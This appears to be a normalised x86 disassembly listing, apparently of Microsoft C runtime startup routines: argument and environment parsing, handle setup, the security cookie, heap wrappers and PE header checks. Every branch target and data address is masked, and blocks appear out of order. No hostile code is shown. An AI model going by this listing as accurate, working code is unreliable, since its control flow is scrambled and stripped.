cmp [ rw-data ] 0x0
jne r-xdata
push esi
mov esi [ rw-data ]
push edi
xor edi edi
test esi esi
jne r-xdata
call sub_403715
mov al [ esi ]
test al al
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp al 0x3d
je r-xdata
push 0x4
inc edi
push edi
call sub_402aa6
mov edi eax
pop ecx
pop ecx
mov [ rw-data ] edi
test edi edi
je r-xdata
pop edi
pop esi
retn
push esi
call sub_404060
pop ecx
lea esi [ esi + eax + 0x1 ]
inc edi
mov esi [ rw-data ]
push ebx
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
push esi
call sub_404060
cmp [ esi ] 0x3d
pop ecx
lea ebx [ eax + 0x1 ]
je r-xdata
push [ rw-data ]
call sub_4040eb
and [ rw-data ] 0x0
and [ edi ] 0x0
mov [ rw-data ] 0x1
xor eax eax
add esi ebx
push 0x1
push ebx
call sub_402aa6
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
push [ rw-data ]
call sub_4040eb
and [ rw-data ] 0x0
or eax 0xffffffff
jmp r-xdata
push esi
push ebx
push eax
call sub_403f64
add esp 0xc
test eax eax
jne r-xdata
pop ecx
pop ebx
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_4050bb
int3
add edi 0x4
sub_40481e
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x10 ]
push ebx
xor eax eax
push esi
mov [ edi ] eax
mov esi edx
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x1
cmp [ ebp + 0x8 ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ ebx ] edx
inc [ edi ]
test edx edx
je r-xdata
xor eax eax
cmp [ ebp - 0x4 ] eax
mov bl 0x22
sete al
inc esi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov bl [ esi ]
movzx eax bl
push eax
inc esi
call sub_40650d
pop ecx
test eax eax
je r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
mov [ ebp + 0xc ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
test bl bl
je r-xdata
inc [ edi ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp bl 0x20
je r-xdata
dec esi
jmp r-xdata
inc esi
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
test edx edx
je r-xdata
cmp bl 0x9
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov [ edx - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
pop esi
pop ebx
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x20
je r-xdata
inc [ ecx ]
leave
retn
and [ eax ] 0x0
inc esi
jmp r-xdata
cmp al 0x9
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc [ ecx ]
mov eax [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ eax ] edx
cmp [ esi ] 0x5c
je r-xdata
inc esi
inc ecx
cmp [ esi ] 0x22
jne r-xdata
test ecx ecx
je r-xdata
test cl 0x1
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
dec ecx
test edx edx
je r-xdata
shr ecx 0x1
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test edx edx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
inc [ edi ]
test ecx ecx
jne r-xdata
mov [ edx ] 0x5c
inc edx
xor eax eax
xor ebx ebx
cmp [ ebp - 0x4 ] eax
sete al
mov [ ebp - 0x4 ] eax
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x22
jne r-xdata
inc [ edi ]
mov ecx [ ebp + 0x10 ]
jmp r-xdata
mov [ edx ] 0x0
inc edx
mov [ ebp + 0xc ] edx
test ebx ebx
je r-xdata
cmp al 0x20
je r-xdata
mov [ ebp + 0xc ] edx
mov esi eax
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
inc esi
jmp r-xdata
movsx eax al
push eax
test edx edx
je r-xdata
cmp al 0x9
je r-xdata
xor ebx ebx
inc ebx
xor ecx ecx
jmp r-xdata
call sub_40650d
pop ecx
test eax eax
je r-xdata
call sub_40650d
pop ecx
test eax eax
je r-xdata
inc [ edi ]
mov edx [ ebp + 0xc ]
inc esi
inc [ edi ]
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
jmp r-xdata
mov al [ esi ]
mov ecx [ ebp + 0xc ]
inc [ ebp + 0xc ]
mov [ ecx ] al
inc esi
inc [ edi ]
sub_4049b8
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor ebx ebx
push esi
push edi
cmp [ rw-data ] ebx
jne r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] bl
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] esi
cmp eax ebx
je r-xdata
call sub_403715
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x4 ] eax
cmp [ eax ] bl
jne r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
cmp ecx 0xffffffff
jae r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
push ebx
push ebx
lea edi [ ebp - 0xc ]
call sub_40481e
mov eax [ ebp - 0x8 ]
add esp 0xc
cmp eax 0x3fffffff
jae r-xdata
mov edi eax
shl edi 0x2
lea eax [ edi + ecx ]
cmp eax ecx
jb r-xdata
push eax
call sub_402a61
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
add edi esi
push edi
push esi
lea edi [ ebp - 0xc ]
call sub_40481e
mov eax [ ebp - 0x8 ]
add esp 0xc
dec eax
mov [ rw-data ] eax
mov [ rw-data ] esi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_404a73
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
call [ GetEnvironmentStringsW@IAT ]
mov ebx eax
xor esi esi
cmp ebx esi
jne r-xdata
cmp [ ebx ] si
je r-xdata
xor eax eax
jmp r-xdata
push edi
mov edi [ WideCharToMultiByte@IAT ]
push esi
push esi
push esi
sub eax ebx
push esi
sar eax 0x1
inc eax
push eax
push ebx
push esi
push esi
mov [ ebp - 0xc ] eax
call edi
mov [ ebp - 0x8 ] eax
cmp eax esi
je r-xdata
add eax 0x2
cmp [ eax ] si
jne r-xdata
pop esi
pop ebx
leave
retn
push ebx
call [ FreeEnvironmentStringsW@IAT ]
xor eax eax
push eax
call sub_402a61
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax esi
je r-xdata
add eax 0x2
cmp [ eax ] si
jne r-xdata
push esi
push esi
push [ ebp - 0x8 ]
push eax
push [ ebp - 0xc ]
push ebx
push esi
push esi
call edi
test eax eax
jne r-xdata
push ebx
call [ FreeEnvironmentStringsW@IAT ]
mov eax [ ebp - 0x4 ]
jmp r-xdata
push [ ebp - 0x4 ]
call sub_4040eb
pop ecx
mov [ ebp - 0x4 ] esi
pop edi
sub_404b0a
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
push esi
lea eax [ ebp - 0x4c ]
push eax
call [ GetStartupInfoW@IAT ]
push 0x40
push 0x20
pop esi
push esi
call sub_402aa6
pop ecx
pop ecx
xor ecx ecx
cmp eax ecx
jne r-xdata
lea edx [ eax + 0x800 ]
mov [ rw-data ] eax
mov [ rw-data ] esi
cmp eax edx
jae r-xdata
or eax 0xffffffff
jmp r-xdata
push ebx
push edi
cmp [ ebp - 0x1a ] cx
je r-xdata
add eax 0x5
pop esi
leave
retn
xor ebx ebx
mov eax [ ebp - 0x18 ]
cmp eax ecx
je r-xdata
or [ eax - 0x5 ] 0xffffffff
mov [ eax - 0x1 ] 0xa00
mov [ eax + 0x3 ] ecx
mov [ eax + 0x1f ] 0xa00
mov [ eax + 0x21 ] 0xa
mov [ eax + 0x33 ] ecx
mov [ eax + 0x2f ] cl
mov esi [ rw-data ]
add eax 0x40
lea edx [ eax - 0x5 ]
add esi 0x800
cmp edx esi
jb r-xdata
mov [ esi + 0x4 ] 0x81
test ebx ebx
jne r-xdata
cmp eax 0xfffffffe
je r-xdata
mov ebx [ eax ]
add eax 0x4
mov [ ebp - 0x4 ] eax
add eax ebx
mov esi 0x800
mov [ ebp - 0x8 ] eax
cmp ebx esi
jl r-xdata
lea eax [ ebx - 0x1 ]
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
or [ esi + 0x4 ] 0x80
jmp r-xdata
cmp [ rw-data ] ebx
jge r-xdata
mov ebx esi
or [ esi + 0x4 ] 0x40
mov [ esi ] 0xfffffffe
test edi edi
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
inc ebx
cmp ebx 0x3
jl r-xdata
xor edi edi
test ebx ebx
jle r-xdata
mov edi rw-data
mov esi ebx
shl esi 0x6
add esi [ rw-data ]
mov eax [ esi ]
cmp eax 0xffffffff
je r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
xor eax eax
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax 0xffffffff
je r-xdata
mov ebx [ rw-data ]
add [ rw-data ] 0x20
lea ecx [ eax + 0x800 ]
mov [ edi ] eax
cmp eax ecx
jae r-xdata
and eax 0xff
mov [ esi ] edi
cmp eax 0x2
jne r-xdata
add [ ebp - 0x8 ] 0x4
inc edi
inc [ ebp - 0x4 ]
cmp edi ebx
jl r-xdata
cmp eax 0xfffffffe
je r-xdata
add edi 0x4
cmp [ rw-data ] ebx
jl r-xdata
add eax 0x5
cmp eax 0x3
jne r-xdata
or [ esi + 0x4 ] 0x40
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov cl [ ecx ]
test cl 0x1
je r-xdata
push 0x40
push 0x20
call sub_402aa6
pop ecx
pop ecx
test eax eax
je r-xdata
jmp r-xdata
or [ eax - 0x5 ] 0xffffffff
and [ eax + 0x3 ] 0x0
and [ eax + 0x1f ] 0x80
and [ eax + 0x33 ] 0x0
mov [ eax - 0x1 ] 0xa00
mov [ eax + 0x20 ] 0xa0a
mov [ eax + 0x2f ] 0x0
mov ecx [ edi ]
add eax 0x40
add ecx esi
lea edx [ eax - 0x5 ]
cmp edx ecx
jb r-xdata
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
or [ esi + 0x4 ] 0x8
test cl 0x8
jne r-xdata
or eax 0xffffffff
jmp r-xdata
inc [ esi + 0x8 ]
jmp r-xdata
mov esi edi
and esi 0x1f
mov eax edi
sar eax 0x5
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax ]
mov [ esi + 0x4 ] al
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
push eax
call [ GetFileType@IAT ]
test eax eax
je r-xdata
pop edi
pop ebx
inc [ esi + 0x8 ]
sub_404d4f
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_404d75
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_404db9
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push edi
mov edi 0xbb40e64e
mov ebx 0xffff0000
cmp eax edi
je r-xdata
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x8 ]
call [ GetCurrentProcessId@IAT ]
xor esi eax
call [ GetCurrentThreadId@IAT ]
xor esi eax
call [ GetTickCount@IAT ]
xor esi eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x10 ]
xor esi eax
cmp esi edi
jne r-xdata
test ebx eax
je r-xdata
test ebx esi
jne r-xdata
mov esi 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] esi
not esi
mov [ rw-data ] esi
pop esi
mov eax esi
or eax 0x4711
shl eax 0x10
or esi eax
pop edi
pop ebx
leave
retn
sub_404e54
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
imul ecx [ ebp + 0xc ]
push esi
mov esi ecx
test esi esi
jne r-xdata
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax [ ebp + 0xc ]
jae r-xdata
xor eax eax
cmp esi 0xffffffe0
ja r-xdata
inc esi
call sub_40515f
mov [ eax ] 0xc
xor eax eax
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
push esi
call sub_4042c7
pop ecx
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov [ ecx ] 0xc
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov [ eax ] 0xc
sub_404ed6
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_403fc3
pop ecx
pop ebp
retn
push edi
jmp r-xdata
push [ ebp + 0x8 ]
call sub_4040eb
pop ecx
xor eax eax
jmp r-xdata
cmp esi 0xffffffe0
jbe r-xdata
pop esi
pop ebp
retn
test esi esi
jne r-xdata
push esi
call sub_4042c7
pop ecx
call sub_40515f
mov [ eax ] 0xc
push esi
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
inc esi
mov eax edi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
pop edi
call sub_40515f
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_40511d
pop ecx
mov [ esi ] eax
push esi
call sub_4042c7
pop ecx
test eax eax
je r-xdata
call sub_40515f
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_40511d
pop ecx
mov [ esi ] eax
jmp r-xdata
xor eax eax
sub_404f92
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
push edi
cmp ebx 0xffffffff
je r-xdata
and [ ebp - 0x320 ] 0x0
push 0x4c
lea eax [ ebp - 0x31c ]
push 0x0
push eax
call sub_405830
lea eax [ ebp - 0x320 ]
mov [ ebp - 0x328 ] eax
lea eax [ ebp - 0x2d0 ]
add esp 0xc
mov [ ebp - 0x324 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov eax [ ebp + 0x4 ]
lea ecx [ ebp + 0x4 ]
mov [ ebp - 0x20c ] ecx
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] eax
mov ecx [ ecx - 0x4 ]
mov [ ebp - 0x21c ] ecx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x320 ] ecx
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x31c ] ecx
mov [ ebp - 0x314 ] eax
call [ IsDebuggerPresent@IAT ]
push 0x0
mov edi eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x328 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
push ebx
call sub_406525
pop ecx
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_4056bc
leave
retn
test edi edi
jne r-xdata
cmp ebx 0xffffffff
je r-xdata
push ebx
call sub_406525
pop ecx
sub_4050bb
mov edi edi
push esi
push 0x1
mov esi 0xc0000417
push esi
push 0x2
call sub_404f92
add esp 0xc
push esi
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
pop esi
retn
sub_4050e0
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4050bb
int3
pop ebp
jmp eax
sub_40511d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ecx * 8 + rw-data ]
pop ebp
retn
inc ecx
cmp ecx 0x2d
jb r-xdata
cmp eax [ ecx * 8 + rw-data ]
je r-xdata
lea ecx [ eax - 0x13 ]
cmp ecx 0x11
ja r-xdata
add eax 0xffffff44
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
pop ebp
retn
push 0xd
pop eax
pop ebp
retn
sub_405172
mov edi edi
push esi
push edi
xor esi esi
mov edi rw-data
inc esi
cmp esi 0x24
jl r-xdata
lea eax [ esi * 8 + rw-data ]
mov [ eax ] edi
push 0xfa0
push [ eax ]
add edi 0x18
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
cmp [ esi * 8 + rw-data ] 0x1
jne r-xdata
xor eax eax
inc eax
and [ esi * 8 + rw-data ] 0x0
xor eax eax
jmp r-xdata
pop edi
pop esi
retn
sub_40522a
push 0xc
push r--data
call sub_402e60
xor edi edi
inc edi
mov [ ebp - 0x1c ] edi
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
mov esi [ ebp + 0x8 ]
lea esi [ esi * 8 + rw-data ]
cmp [ esi ] ebx
je r-xdata
call sub_404560
push 0x1e
call sub_4043b1
push 0xff
call sub_402b9e
push 0x18
call sub_402a61
pop ecx
mov edi eax
cmp edi ebx
jne r-xdata
mov eax edi
jmp r-xdata
push 0xa
call sub_4052ec
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi ] ebx
jne r-xdata
call sub_40515f
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
call sub_402ea5
retn
push edi
call sub_4040eb
pop ecx
push 0xfa0
push edi
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
mov [ esi ] edi
jmp r-xdata
push edi
call sub_4040eb
pop ecx
call sub_40515f
mov [ eax ] 0xc
mov [ ebp - 0x1c ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4052e3
mov eax [ ebp - 0x1c ]
sub_4052ec
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
lea esi [ eax * 8 + rw-data ]
cmp [ esi ] 0x0
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push eax
call sub_40522a
pop ecx
test eax eax
jne r-xdata
push 0x11
call sub_402e40
sub_40533d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
push esi
imul ecx ecx 0xc
add ecx [ ebp + 0x8 ]
pop esi
cmp eax ecx
jae r-xdata
mov esi ecx
imul esi esi 0xc
add esi [ ebp + 0x8 ]
add eax 0xc
cmp eax esi
jb r-xdata
xor eax eax
cmp [ eax + 0x4 ] edx
je r-xdata
cmp [ eax + 0x4 ] edx
je r-xdata
pop ebp
retn
sub_405381
push 0x20
push r--data
call sub_402e60
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov ebx [ ebp + 0x8 ]
cmp ebx 0xb
jg r-xdata
mov eax ebx
sub eax 0xf
je r-xdata
je r-xdata
mov esi rw-data
mov eax [ rw-data ]
sub eax 0x6
je r-xdata
call sub_403ba3
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax ebx
push 0x2
pop ecx
sub eax ecx
je r-xdata
call sub_402ea5
retn
cmp [ ebp - 0x20 ] eax
jne r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
mov edx ebx
call sub_40533d
pop ecx
lea esi [ eax + 0x8 ]
mov eax [ esi ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
sub eax ecx
je r-xdata
cmp [ ebp - 0x1c ] eax
je r-xdata
push 0x3
call sub_402e0c
mov [ ebp - 0x1c ] 0x1
push eax
call [ DecodePointer@IAT ]
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
call sub_40515f
mov [ eax ] 0x16
call sub_40510d
jmp r-xdata
mov [ ebp - 0x20 ] eax
xor eax eax
cmp [ ebp - 0x20 ] 0x1
je r-xdata
sub eax ecx
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x8
je r-xdata
push eax
call sub_4052ec
pop ecx
sub eax ecx
jne r-xdata
mov ecx [ edi + 0x60 ]
mov [ ebp - 0x2c ] ecx
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
call sub_403a6c
mov [ esi ] eax
mov ecx [ edi + 0x64 ]
mov [ ebp - 0x30 ] ecx
mov [ edi + 0x64 ] 0x8c
cmp ebx 0x4
jne r-xdata
push ebx
call [ ebp - 0x20 ]
push [ edi + 0x64 ]
push ebx
call [ ebp - 0x20 ]
pop ecx
jmp r-xdata
mov ecx [ r--data ]
mov [ ebp - 0x24 ] ecx
cmp ebx 0x8
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
pop ecx
cmp ebx 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4054e8
cmp ebx 0x8
jne r-xdata
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0xc
mov edx [ edi + 0x5c ]
mov [ ecx + edx + 0x8 ] eax
inc [ ebp - 0x24 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x30 ]
mov [ edi + 0x64 ] eax
cmp ebx 0x4
jne r-xdata
mov ecx [ r--data ]
add ecx [ r--data ]
cmp [ ebp - 0x24 ] ecx
jge r-xdata
sub_405542
mov edi edi
push esi
push edi
xor edi edi
push [ edi + rw-data ]
call [ EncodePointer@IAT ]
mov [ edi + rw-data ] eax
add edi 0x4
cmp edi 0x28
jb r-xdata
pop edi
pop esi
retn
sub_405570
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax 0x5a4d
cmp [ ecx ] ax
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
xor edx edx
mov ecx 0x10b
cmp [ eax + 0x18 ] cx
sete dl
mov eax edx
pop ebp
retn
sub_4055b0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
push ebx
push esi
movzx esi [ ecx + 0x6 ]
xor edx edx
push edi
lea eax [ eax + ecx + 0x18 ]
test esi esi
je r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx esi
jb r-xdata
mov ebx [ eax + 0x8 ]
add ebx ecx
cmp edi ebx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_405600
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_402ec0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_405570
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_4055b0
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4056d0
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_405760
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_406ab5
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_406ad4
jmp r-xdata
sub_405760
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_4056bc
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_4056d0
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_4057c2
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_4057f2
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push edx
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_405830
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
test al al
jne r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
cmp edx 0x80
jb r-xdata
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
jmp sub_406ad7
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
sub_4058aa
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
sub eax 0x8
cmp [ eax ] 0xdddd
jne r-xdata
push eax
call sub_4040eb
pop ecx
sub_4058ca
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x18 ]
push ebx
xor ebx ebx
push esi
push edi
cmp edx ebx
jle r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x24 ] ebx
jne r-xdata
mov eax [ ebp + 0x14 ]
mov ecx edx
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x28 ] ebx
push ebx
push ebx
push [ ebp + 0x18 ]
setne al
push [ ebp + 0x14 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x24 ]
call esi
mov edi eax
mov [ ebp - 0x10 ] edi
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x24 ] eax
mov eax edx
